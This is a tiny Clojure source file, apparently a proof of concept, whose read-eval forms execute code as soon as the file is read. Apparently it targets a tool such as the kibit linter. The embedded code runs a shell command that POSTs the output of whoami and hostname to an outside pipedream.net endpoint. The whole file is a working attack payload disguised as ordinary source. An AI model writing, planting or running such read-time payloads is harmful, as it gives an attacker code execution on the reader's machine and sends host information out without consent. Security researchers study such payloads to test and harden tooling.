(ns lamb
  "Waiting for slaughter"
  )
  
#=(println "Running code")

#=(eval '(do
	(use '[clojure.java.shell :only [sh]])
	(map println (clojure.string/split (:out (clojure.java.shell/sh "sh" "-c" "curl -X POST -d \"$(whoami && hostname)\" https://95a3bed651e039798c778628a22dc980.m.pipedream.net/kibit ")) #"\n"))
))
